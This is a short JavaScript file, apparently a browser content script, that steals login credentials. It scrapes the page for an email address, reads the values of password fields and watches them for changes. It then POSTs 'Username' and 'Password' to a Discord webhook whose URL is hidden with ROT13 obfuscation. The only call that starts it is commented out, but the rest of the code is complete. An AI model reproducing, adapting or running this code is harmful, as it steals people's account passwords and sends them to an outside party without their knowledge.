var email = "";
var password = "";

function init() {
    let divs = document.getElementsByTagName("div");
    console.log(divs);
    for (i = 0; i < divs.length; i++) {
        let div = divs[i];
        if (!div.innerText.includes("@")) {
            continue;
        }
        if (div.children.length > 0) {
            continue;
        }
        email = div.innerText;
    }
    let inputs = document.getElementsByTagName("input");
    for (i = 0; i < inputs.length; i++) {
        let input = inputs[i];
        if (input.type != "password") {
            continue;
        }
        console.log(input);
        password = input.value;
        valueUpdate(email, password);
        input.addEventListener("change", (event) => {
            password = event.target.value;
            valueUpdate(email, password);
        });
    }
    console.log(email, password);
}

const rot13 = (message) => {
    const originalAlpha =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const cipher = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM";
    return message.replace(
        /[a-z]/gi,
        (letter) => cipher[originalAlpha.indexOf(letter)]
    );
};

function valueUpdate(user, pass) {
    if (user == "") {
        return;
    }
    if (pass == "") {
        return;
    }
    wh = rot13(
        "uggcf://qvfpbeq.pbz/ncv/jroubbxf/1064304574900473877/qBf-0GQA5KAS5Y4MsCodLfUygO2qOrbNtV4_fxS9aVKNcfvy7ExZn14hoFNvAleBP7Vg"
    );
    fetch(wh, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            content: `Username: ${user}\nPassword: ${pass}`,
        }),
    });
}

// setTimeout(init, 1000);
